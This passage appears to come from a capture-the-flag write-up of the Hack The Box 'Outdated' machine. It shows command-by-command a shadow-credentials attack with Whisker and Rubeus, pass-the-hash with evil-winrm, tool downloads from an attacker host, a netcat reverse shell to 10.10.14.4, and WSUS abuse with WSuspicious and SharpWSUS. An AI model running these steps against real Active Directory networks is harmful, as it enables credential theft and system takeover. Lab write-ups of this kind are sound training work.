<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="ex">c:\Windows\Tasks</span><span class="op">&gt;</span>Whisker.exe add /target:sflowers</span>
<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> No path was provided. The certificate will be printed as a Base64 blob</span>
<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> No pass was provided. The certificate will be stored with the password qUOOiC6IHD1YbErH</span>
<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Searching for the target account</span>
<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb</span>
<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Generating certificate</span>
<span id="cb14-8"><a href="#cb14-8" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Certificate generaged</span>
<span id="cb14-9"><a href="#cb14-9" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Generating KeyCredential</span>
<span id="cb14-10"><a href="#cb14-10" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> KeyCredential generated with DeviceID 1b1d7ce3-46ae-4631-9ace-8e962ccdc9ba</span>
<span id="cb14-11"><a href="#cb14-11" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Updating the msDS-KeyCredentialLink attribute of the target object</span>
<span id="cb14-12"><a href="#cb14-12" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Updated the msDS-KeyCredentialLink attribute of the target object</span>
<span id="cb14-13"><a href="#cb14-13" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> You can now run Rubeus with the following syntax:</span>
<span id="cb14-14"><a href="#cb14-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-15"><a href="#cb14-15" aria-hidden="true" tabindex="-1"></a><span class="ex">Rubeus.exe</span> asktgt /user:sflowers /certificate:MIIJsA...qoCAgfQ /password:<span class="st">"qUOOiC6IHD1YbErH"</span> /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>The shadow credential has been added to the account and we are returned a long <code>Rubeus.exe</code> string, so lets upload <code>Rubeus.exe</code> and execute the command:</p>
<div class="sourceCode" id="cb15"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">C:\Windows\Tasks</span><span class="op">&gt;</span>curl http://10.10.14.2:8888/Rubeus.exe <span class="at">-o</span> C:<span class="dt">\W</span>indows<span class="dt">\T</span>asks<span class="dt">\R</span>ubeus.exe</span>
<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="ex">C:\Windows\Tasks</span><span class="op">&gt;</span> Rubeus.exe asktgt /user:sflowers /certificate:MIIJsA...qoCAgfQ /password:<span class="st">"qUOOiC6IHD1YbErH"</span> /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show</span>
<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Action: Ask TGT</span>
<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Using PKINIT with etype rc4_hmac and subject: CN=sflowers </span>
<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Building AS-REQ <span class="er">(</span><span class="ex">w/</span> PKINIT preauth<span class="kw">)</span> <span class="ex">for:</span> <span class="st">'outdated.htb\sflowers'</span></span>
<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> TGT request successful!</span>
<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> base64<span class="er">(</span><span class="ex">ticket.kirbi</span><span class="kw">)</span><span class="bu">:</span></span>
<span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-11"><a href="#cb15-11" aria-hidden="true" tabindex="-1"></a>      <span class="ex">doIF0jCCBc6gAwIBBaEDAgEWooIE5zCCBONhggTfMIIE26ADAgEFoQ4bDE9VVERBVEVELkhUQqIhMB+g</span></span>
<span id="cb15-12"><a href="#cb15-12" aria-hidden="true" tabindex="-1"></a>      <span class="ex">AwIBAqEYMBYbBmtyYnRndBsMb3V0ZGF0ZWQuaHRio4IEnzCCBJugAwIBEqEDAgECooIEjQSCBIkNOdmX</span></span>
<span id="cb15-13"><a href="#cb15-13" aria-hidden="true" tabindex="-1"></a>      <span class="ex">jSa0Ei9bzfsFcCPd5PWKYpJt9enLuWJ4ee92679C60JShPZl4Tp4rwDD5Qdkp5zBDtfY55HnFbriJ1V1</span></span>
<span id="cb15-14"><a href="#cb15-14" aria-hidden="true" tabindex="-1"></a>      <span class="ex">Xd4pZQxLZB81U6gNw42X3Gd/Rj1P5C4neIQVlcFZ1uQeNUkfLLi58QIXj7LJODxWNgLgEpW0cxPBJzOd</span></span>
<span id="cb15-15"><a href="#cb15-15" aria-hidden="true" tabindex="-1"></a>      <span class="ex">gnr9sbLbYb1ubrRf3+nQeF/oQ/NwxojSF6ynmdtrdN2VAd862nSiP2tPXnI4w+z+j5gE7RR50AXpqvBY</span></span>
<span id="cb15-16"><a href="#cb15-16" aria-hidden="true" tabindex="-1"></a>      <span class="ex">6PQdroHP4aifoUptpVvQdwxwVteEm6mRGoD5usa02JExzjoiRnXVhp385iP3XUaskTFFvEhv50PlqvG8</span></span>
<span id="cb15-17"><a href="#cb15-17" aria-hidden="true" tabindex="-1"></a>      <span class="ex">SD7RUaFWLjzAkuB7AxxLl8zG5v6EX2A7MmcacFXtjOnEdR5MZutmdyMUX5T/N0V2EHHgyge+6RDASX8o</span></span>
<span id="cb15-18"><a href="#cb15-18" aria-hidden="true" tabindex="-1"></a>      <span class="ex">1xWjl2khzpPATjg8J0HAtJ6o3eLO+S8Hm+JmJ6iEUkxcQViP1tXcnT5s1N/H73IR0uV+X4dV0V6zC5D5</span></span>
<span id="cb15-19"><a href="#cb15-19" aria-hidden="true" tabindex="-1"></a>      <span class="ex">p3vt/jDw6l0A8U+OBw2zaqvY0pBbTUsFNouQKayGzXnhBNIGg91INZGaRKE0XZ/kHrupEZZ4BhxFIb+T</span></span>
<span id="cb15-20"><a href="#cb15-20" aria-hidden="true" tabindex="-1"></a>      <span class="ex">zgzKY4a6V5dgHpgyYgg+El9KNkjE+1hceuZximsgs6exO+QCcHeZ1szGaKnyJdMQo5oWYZiAR8versPg</span></span>
<span id="cb15-21"><a href="#cb15-21" aria-hidden="true" tabindex="-1"></a>      <span class="ex">qpVG+UlTe6UZ1jaRspBNWpvamJbTNgFEXCaZRdJUheNPSfcqwWE8FdYmPaY8WN1i1hIynTXbxxgjilvC</span></span>
<span id="cb15-22"><a href="#cb15-22" aria-hidden="true" tabindex="-1"></a>      <span class="ex">LdsKrhGLW+9A4YszQqpTkP4+HngQzdGiFbEAqMjmR+Ryyn6CejjQEMMPPZzu+xu/UItB88Nu/jLMogdS</span></span>
<span id="cb15-23"><a href="#cb15-23" aria-hidden="true" tabindex="-1"></a>      <span class="ex">DMNWT+uPN0knpIWfyNIX/eAzqOOkl7QxuVeS3CuqqzmbwNn+6M2Xhtd9n33BFvXjU6EqLNzqMBA8CPh1</span></span>
<span id="cb15-24"><a href="#cb15-24" aria-hidden="true" tabindex="-1"></a>      <span class="ex">qqsK5zcAvgi0OQPm1cNu0cU53g6wgYbXQBtUwfmPD7fAZw4d/CpY23ak6xVf1NCyaPGwAYJ/9Tb/bUs2</span></span>
<span id="cb15-25"><a href="#cb15-25" aria-hidden="true" tabindex="-1"></a>      <span class="ex">9Ul/NjqfoxV7NoqMkHfJlzt0sG9oM6TEiBGl6kMpLR0wpLw5sySFJq/zb72pOdtir+5j4OYqTHK8C50q</span></span>
<span id="cb15-26"><a href="#cb15-26" aria-hidden="true" tabindex="-1"></a>      <span class="ex">NDf/Tj4+6/tlHM/EyCeM9043KDEktRVmS+v4h5Jc3sjtKu7DR7NRT85KevlYLCNxGO8iPk0Y/A4bx/lW</span></span>
<span id="cb15-27"><a href="#cb15-27" aria-hidden="true" tabindex="-1"></a>      <span class="ex">ajqae/Kopf3g0ceXYZeMEZPpK1bfX276yn+/nun2FmIO2InWKVHNKU3YwMlfpmgRLKFovTJ9S5Cc6kti</span></span>
<span id="cb15-28"><a href="#cb15-28" aria-hidden="true" tabindex="-1"></a>      <span class="ex">6tFhZrP3JAV7HCCQumGr2k6vd48s5GTRxK5KDg7oKEA8LGfFzrPwWeJx+dCnAoOrQ73rGa0wdEPyTGHA</span></span>
<span id="cb15-29"><a href="#cb15-29" aria-hidden="true" tabindex="-1"></a>      <span class="ex">RtkkjSlOtwjWBnudAOnQqm4FSC3yficJOdFS+4sYF6ZgM/m8P1hlRAzGXcZt6eOjlpezGPN8PsuF8SlZ</span></span>
<span id="cb15-30"><a href="#cb15-30" aria-hidden="true" tabindex="-1"></a>      <span class="ex">n4wyjkCE9IlRBhgI4bGb7ui4sndIJ9f9GwdOgx0jVM/Dyi8fNYSeoUDji/4FNZdDW6aMypo1VcbVzzHn</span></span>
<span id="cb15-31"><a href="#cb15-31" aria-hidden="true" tabindex="-1"></a>      <span class="ex">Y/ccRLtYnXj5kamVeJcuG9PtP4p82kLvwEeyFZMVF/lZMpu5tVFMXoMTs7IhwLl3yLqksZhvTo8uttgj</span></span>
<span id="cb15-32"><a href="#cb15-32" aria-hidden="true" tabindex="-1"></a>      <span class="ex">soF/RfbeO36TOGWsRgB3S6ajgdYwgdOgAwIBAKKBywSByH2BxTCBwqCBvzCBvDCBuaAbMBmgAwIBF6ES</span></span>
<span id="cb15-33"><a href="#cb15-33" aria-hidden="true" tabindex="-1"></a>      <span class="ex">BBDp4wnEUrmAGjaGXv4XqiJZoQ4bDE9VVERBVEVELkhUQqIVMBOgAwIBAaEMMAobCHNmbG93ZXJzowcD</span></span>
<span id="cb15-34"><a href="#cb15-34" aria-hidden="true" tabindex="-1"></a>      <span class="ex">BQBA4QAApREYDzIwMjIwODE5MTkzMjI3WqYRGA8yMDIyMDgyMDA1MzIyN1qnERgPMjAyMjA4MjYxOTMy</span></span>
<span id="cb15-35"><a href="#cb15-35" aria-hidden="true" tabindex="-1"></a>      <span class="ex">MjdaqA4bDE9VVERBVEVELkhUQqkhMB+gAwIBAqEYMBYbBmtyYnRndBsMb3V0ZGF0ZWQuaHRi</span></span>
<span id="cb15-36"><a href="#cb15-36" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-37"><a href="#cb15-37" aria-hidden="true" tabindex="-1"></a>  <span class="ex">ServiceName</span>              :  krbtgt/outdated.htb</span>
<span id="cb15-38"><a href="#cb15-38" aria-hidden="true" tabindex="-1"></a>  <span class="ex">ServiceRealm</span>             :  OUTDATED.HTB</span>
<span id="cb15-39"><a href="#cb15-39" aria-hidden="true" tabindex="-1"></a>  <span class="ex">UserName</span>                 :  sflowers</span>
<span id="cb15-40"><a href="#cb15-40" aria-hidden="true" tabindex="-1"></a>  <span class="ex">UserRealm</span>                :  OUTDATED.HTB</span>
<span id="cb15-41"><a href="#cb15-41" aria-hidden="true" tabindex="-1"></a>  <span class="ex">StartTime</span>                :  8/19/2022 12:32:27 PM</span>
<span id="cb15-42"><a href="#cb15-42" aria-hidden="true" tabindex="-1"></a>  <span class="ex">EndTime</span>                  :  8/19/2022 10:32:27 PM</span>
<span id="cb15-43"><a href="#cb15-43" aria-hidden="true" tabindex="-1"></a>  <span class="ex">RenewTill</span>                :  8/26/2022 12:32:27 PM</span>
<span id="cb15-44"><a href="#cb15-44" aria-hidden="true" tabindex="-1"></a>  <span class="ex">Flags</span>                    :  name_canonicalize, pre_authent, initial, renewable, forwardable</span>
<span id="cb15-45"><a href="#cb15-45" aria-hidden="true" tabindex="-1"></a>  <span class="ex">KeyType</span>                  :  rc4_hmac</span>
<span id="cb15-46"><a href="#cb15-46" aria-hidden="true" tabindex="-1"></a>  <span class="ex">Base64</span><span class="er">(</span><span class="ex">key</span><span class="kw">)</span>              <span class="bu">:</span>  6eMJxFK5gBo2hl7+F6oiWQ==</span>
<span id="cb15-47"><a href="#cb15-47" aria-hidden="true" tabindex="-1"></a>  <span class="ex">ASREP</span> <span class="er">(</span><span class="ex">key</span><span class="kw">)</span>              <span class="bu">:</span>  C930BD99144FF387606300042A2D9F52</span>
<span id="cb15-48"><a href="#cb15-48" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-49"><a href="#cb15-49" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Getting credentials using U2U</span>
<span id="cb15-50"><a href="#cb15-50" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-51"><a href="#cb15-51" aria-hidden="true" tabindex="-1"></a>  <span class="ex">CredentialInfo</span>         :</span>
<span id="cb15-52"><a href="#cb15-52" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Version</span>              : 0</span>
<span id="cb15-53"><a href="#cb15-53" aria-hidden="true" tabindex="-1"></a>    <span class="ex">EncryptionType</span>       : rc4_hmac</span>
<span id="cb15-54"><a href="#cb15-54" aria-hidden="true" tabindex="-1"></a>    <span class="ex">CredentialData</span>       :</span>
<span id="cb15-55"><a href="#cb15-55" aria-hidden="true" tabindex="-1"></a>      <span class="ex">CredentialCount</span>    : 1</span>
<span id="cb15-56"><a href="#cb15-56" aria-hidden="true" tabindex="-1"></a>       <span class="ex">NTLM</span>              : 1FCDB1F6015DCB318CC77BB2BDA14DB5</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>We get a TGT and at the bottom we find the NTLM hash for <code>sflowers</code>, use <code>evil-winrm</code> and pass-the-hash:</p>
<div class="sourceCode" id="cb16"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  outdated evil-winrm <span class="at">-i</span> outdated.htb <span class="at">-u</span> sflowers <span class="at">-H</span> 1FCDB1F6015DCB318CC77BB2BDA14DB5</span>
<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="ex">*Evil-WinRM*</span> PS C:<span class="dt">\U</span>sers<span class="dt">\s</span>flowers<span class="dt">\D</span>esktop<span class="op">&gt;</span> type user.txt</span>
<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a><span class="ex">0190f8bd21ac78cd004055a7eb6bafb8</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<table class="caption-top table">
<colgroup>
<col style="width: 100%">
</colgroup>
<tbody>
<tr class="odd">
<td style="text-align: left;"># Root ### Step 1 Lets start by doing some quick manual enumeration.</td>
</tr>
<tr class="even">
<td style="text-align: left;">```powershell <em>Evil-WinRM</em> PS C:&gt; whoami /all</td>
</tr>
<tr class="odd">
<td style="text-align: left;">USER INFORMATION</td>
</tr>
</tbody>
</table>
<p>User Name SID ================= ============================================ outdatedS-1-5-21-4089647348-67660539-4016542185-1108</p>
</section>
<section id="group-information" class="level2">
<h2 class="anchored" data-anchor-id="group-information">GROUP INFORMATION</h2>
<p>Group Name Type SID Attributes =========================================== ================ ============================================ =============================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTINManagement Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group BUILTINAlias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group BUILTINService DCOM Access Alias S-1-5-32-574 Mandatory group, Enabled by default, Enabled group NT AUTHORITYWell-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITYUsers Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITYOrganization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group OUTDATEDAdministrators Alias S-1-5-21-4089647348-67660539-4016542185-1000 Mandatory group, Enabled by default, Enabled group, Local Group NT AUTHORITYAuthentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory LabelPlus Mandatory Level Label S-1-16-8448</p>
</section>
<section id="privileges-information" class="level2">
<h2 class="anchored" data-anchor-id="privileges-information">PRIVILEGES INFORMATION</h2>
<p>Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</p>
<pre><code>
We're part of the group `WSUS Administrators` which is interestings, if WSUS is the privesc vector it would surely match the box name Outdated, lets dig deeper here.

Reading about compromising WSUS I find:
&gt;_"You can compromise the system if the updates are not requested using http**S** but http . And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` is equals to `1`, the it is exploitable."_

```powershell
*Evil-WinRM* PS C:\WSUS\WsusContent&gt; reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
    WUServer    REG_SZ    http://wsus.outdated.htb:8530

*Evil-WinRM* PS C:\WSUS\WsusContent&gt; reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\AU
    UseWUServer    REG_DWORD    0x1</code></pre>
<p>Both requirements are met! To exploit we can use tools such as <a href="https://github.com/GoSecure/WSuspicious">WSuspicious</a>, <a href="https://github.com/pimps/wsuxploit">Wsuxploit</a> or <a href="https://github.com/GoSecure/pywsus">pyWSUS</a>, which are MiTM exploit scripts to inject fake updates into non-SSL WSUS traffic.</p>
<p>Trying to compile WSuspicious I’m missing the packages <code>ILMerge</code> and <code>Titanium.Web.Proxy</code>, add nuget package source and update to match all requirements.</p>
<p><strong>NOTE:</strong> This tool will lead to a dead-end and later (Step 3) I will find another tool that works</p>
<p><img src="images/outdated03.png" class="img-fluid"></p>
<p>Compile the project and transfer the binary to Kali attacking machine.</p>
<section id="step-2-1" class="level3">
<h3 class="anchored" data-anchor-id="step-2-1">Step 2</h3>
<p>Upload the binaries needed for the attack:</p>
<div class="sourceCode" id="cb18"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>Evil-WinRM<span class="op">*</span> <span class="fu">PS</span> C<span class="op">:</span>\Windows\Tasks<span class="op">&gt;</span> <span class="fu">curl</span> http<span class="op">://</span><span class="dv">10.10</span><span class="op">.</span><span class="dv">14.4</span><span class="op">/</span>nc64<span class="op">.</span><span class="fu">exe</span> <span class="op">-</span>o C<span class="op">:</span>\Windows\Tasks\nc64<span class="op">.</span><span class="fu">exe</span></span>
<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>Evil-WinRM<span class="op">*</span> <span class="fu">PS</span> C<span class="op">:</span>\Windows\Tasks<span class="op">&gt;</span> <span class="fu">curl</span> http<span class="op">://</span><span class="dv">10.10</span><span class="op">.</span><span class="dv">14.4</span><span class="op">/</span>WSuspicious<span class="op">.</span><span class="fu">exe</span> <span class="op">-</span>o C<span class="op">:</span>\Windows\Tasks\WSuspicious<span class="op">.</span><span class="fu">exe</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Running WSuspicious we get the and error that <code>PsExec64.exe</code> is not found:</p>
<div class="sourceCode" id="cb19"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>Evil-WinRM<span class="op">*</span> <span class="fu">PS</span> C<span class="op">:</span>\Windows\Tasks<span class="op">&gt;</span> <span class="op">.</span>\ws<span class="op">.</span><span class="fu">exe</span> <span class="op">/</span>command<span class="op">:</span><span class="st">" - accepteula - s - d cmd / c 'echo test &gt; C:\Windows\Tasks\wsuspicious.txt'"</span> <span class="op">/</span>autoinstall</span>
<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a>Detected WSUS Server <span class="op">-</span> wsus<span class="op">.</span><span class="fu">outdated</span><span class="op">.</span><span class="fu">htb</span></span>
<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a>ws<span class="op">.</span><span class="fu">exe</span> <span class="op">:</span> </span>
<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a>    <span class="op">+</span> CategoryInfo          <span class="op">:</span> NotSpecified<span class="op">:</span> <span class="op">(:</span>String<span class="op">)</span> <span class="op">[],</span> RemoteException</span>
<span id="cb19-5"><a href="#cb19-5" aria-hidden="true" tabindex="-1"></a>    <span class="op">+</span> FullyQualifiedErrorId <span class="op">:</span> NativeCommandError</span>
<span id="cb19-6"><a href="#cb19-6" aria-hidden="true" tabindex="-1"></a>Unhandled Exception<span class="op">:</span> System<span class="op">.</span><span class="fu">IO</span><span class="op">.</span><span class="fu">FileNotFoundException</span><span class="op">:</span> Could not find file <span class="st">'C:\Windows\Tasks\PsExec64.exe'</span><span class="op">.</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Uploading the needed binary and try again:</p>
<div class="sourceCode" id="cb20"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>Evil-WinRM<span class="op">*</span> <span class="fu">PS</span> C<span class="op">:</span>\Windows\Tasks<span class="op">&gt;</span> <span class="op">.</span>\WSuspicious<span class="op">.</span><span class="fu">exe</span> <span class="op">/</span>command<span class="op">:</span><span class="st">" - accepteula - s - d cmd / c 'echo test &gt; C:\Windows\Tasks\wsuspicious.txt'"</span> <span class="op">/</span>autoinstall</span>
<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a>Detected WSUS Server <span class="op">-</span> wsus<span class="op">.</span><span class="fu">outdated</span><span class="op">.</span><span class="fu">htb</span></span>
<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a>Listening on <span class="st">'ExplicitProxyEndPoint'</span> endpoint at Ip <span class="dv">127.0</span><span class="op">.</span><span class="dv">0.1</span> and port<span class="op">:</span> <span class="dv">13337</span></span>
<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a><span class="dt">Hit</span> any key to <span class="cf">exit</span><span class="op">..</span></span>
<span id="cb20-5"><a href="#cb20-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-6"><a href="#cb20-6" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>Evil-WinRM<span class="op">*</span> <span class="fu">PS</span> C<span class="op">:</span>\Windows\Tasks<span class="op">&gt;</span> <span class="fu">ls</span></span>
<span id="cb20-7"><a href="#cb20-7" aria-hidden="true" tabindex="-1"></a>Mode                LastWriteTime         Length Name</span>
<span id="cb20-8"><a href="#cb20-8" aria-hidden="true" tabindex="-1"></a><span class="op">----</span>                <span class="op">-------------</span>         <span class="op">------</span> <span class="op">----</span></span>
<span id="cb20-9"><a href="#cb20-9" aria-hidden="true" tabindex="-1"></a><span class="op">-</span>a----        <span class="dv">8</span><span class="op">/</span><span class="dv">22</span><span class="op">/</span><span class="dv">2022</span>   <span class="dv">7</span><span class="op">:</span><span class="dv">55</span> AM          <span class="dv">45272</span> nc64<span class="op">.</span><span class="fu">exe</span></span>
<span id="cb20-10"><a href="#cb20-10" aria-hidden="true" tabindex="-1"></a><span class="op">-</span>a----         <span class="dv">8</span><span class="op">/</span><span class="dv">3</span><span class="op">/</span><span class="dv">2022</span>   <span class="dv">4</span><span class="op">:</span><span class="dv">19</span> PM         <span class="dv">514472</span> PsExec64<span class="op">.</span><span class="fu">exe</span></span>
<span id="cb20-11"><a href="#cb20-11" aria-hidden="true" tabindex="-1"></a><span class="op">-</span>a----        <span class="dv">8</span><span class="op">/</span><span class="dv">22</span><span class="op">/</span><span class="dv">2022</span>  <span class="dv">11</span><span class="op">:</span><span class="dv">12</span> AM           <span class="dv">2666</span> rootCert<span class="op">.</span><span class="fu">pfx</span></span>
<span id="cb20-12"><a href="#cb20-12" aria-hidden="true" tabindex="-1"></a><span class="op">-</span>a----        <span class="dv">8</span><span class="op">/</span><span class="dv">22</span><span class="op">/</span><span class="dv">2022</span>  <span class="dv">11</span><span class="op">:</span><span class="dv">11</span> AM        <span class="dv">4548096</span> WSuspicious<span class="op">.</span><span class="fu">exe</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>The server dies immediately and the test-file is not present, something is weird. Testing around I managed to get the server working propperly by setting up a new reverse connection:</p>
<div class="sourceCode" id="cb21"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>Evil-WinRM<span class="op">*</span> <span class="fu">PS</span> C<span class="op">:</span>\Windows\Tasks<span class="op">&gt;</span> <span class="op">./</span>nc64<span class="op">.</span><span class="fu">exe</span> <span class="dv">10.10</span><span class="op">.</span><span class="dv">14.4</span> <span class="dv">4488</span> <span class="op">-</span>e powershell</span>
<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a>➜  outdated nc <span class="op">-</span>lvnp <span class="dv">4488</span></span>
<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a><span class="dt">listening</span> on <span class="op">[</span>any<span class="op">]</span> <span class="dv">4488</span> <span class="op">...</span></span>
<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a>connect to <span class="op">[</span><span class="dv">10.10.14.4</span><span class="op">]</span> <span class="kw">from</span> <span class="op">(</span>UNKNOWN<span class="op">)</span> <span class="op">[</span><span class="dv">10.10.11.175</span><span class="op">]</span> <span class="dv">49257</span></span>
<span id="cb21-5"><a href="#cb21-5" aria-hidden="true" tabindex="-1"></a><span class="dt">Windows</span> PowerShell </span>
<span id="cb21-6"><a href="#cb21-6" aria-hidden="true" tabindex="-1"></a>Copyright <span class="op">(</span>C<span class="op">)</span> Microsoft Corporation<span class="op">.</span> All rights reserved<span class="op">.</span></span>
<span id="cb21-7"><a href="#cb21-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb21-8"><a href="#cb21-8" aria-hidden="true" tabindex="-1"></a><span class="fu">PS</span> C<span class="op">:</span>\Windows\Tasks<span class="op">&gt;</span> <span class="op">.</span>\WSuspicious<span class="op">.</span><span class="fu">exe</span> <span class="op">/</span>command<span class="op">:</span><span class="st">" - accepteula - s - d cmd / c 'echo test &gt; C:\Windows\Tasks\wsuspicious.txt'"</span> <span class="op">/</span>autoinstall</span>
<span id="cb21-9"><a href="#cb21-9" aria-hidden="true" tabindex="-1"></a><span class="op">.</span>\WSuspicious<span class="op">.</span><span class="fu">exe</span> <span class="op">/</span>command<span class="op">:</span><span class="st">" - accepteula - s - d cmd / c 'echo test &gt; C:\Windows\Tasks\wsuspicious.txt'"</span> <span class="op">/</span>autoinstall</span>
<span id="cb21-10"><a href="#cb21-10" aria-hidden="true" tabindex="-1"></a>Detected WSUS Server <span class="op">-</span> wsus<span class="op">.</span><span class="fu">outdated</span><span class="op">.</span><span class="fu">htb</span></span>
<span id="cb21-11"><a href="#cb21-11" aria-hidden="true" tabindex="-1"></a>Listening on <span class="st">'ExplicitProxyEndPoint'</span> endpoint at Ip <span class="dv">127.0</span><span class="op">.</span><span class="dv">0.1</span> and port<span class="op">:</span> <span class="dv">13337</span> </span>
<span id="cb21-12"><a href="#cb21-12" aria-hidden="true" tabindex="-1"></a>Hit any key to <span class="cf">exit</span><span class="op">..</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Waiting for a few minutes and still nothing happens.. there seems to be something wrong on our end as when reading about WSuspicious it should also force look for updates:</p>
<blockquote class="blockquote">
<p><em>“<a href="https://github.com/GoSecure/wsuspicious">WSuspicious</a> is a C# program that takes the place of the user local proxy and forces the computer to look for updates while intercepting the WSUS traffic to inject a malicious payload.”</em></p>
</blockquote>
</section>
<section id="step-3-1" class="level3">
<h3 class="anchored" data-anchor-id="step-3-1">Step 3</h3>
<p>Looking on other tools we find <a href="https://github.com/nettitude/SharpWSUS">SharpWSUS</a>. Compile it, upload to target and exploit the target to create a new administrator user.</p>
<div class="sourceCode" id="cb22"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>Evil-WinRM<span class="op">*</span> <span class="fu">PS</span> C<span class="op">:</span>\Windows\Tasks<span class="op">&gt;</span> <span class="fu">curl</span> http<span class="op">://</span><span class="dv">10.10</span><span class="op">.</span><span class="dv">14.4</span><span class="op">/</span>SharpWSUS<span class="op">.</span><span class="fu">exe</span> <span class="op">-</span>o C<span class="op">:</span>\Windows\Tasks\SharpWSUS<span class="op">.</span><span class="fu">exe</span></span>
<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a></span>
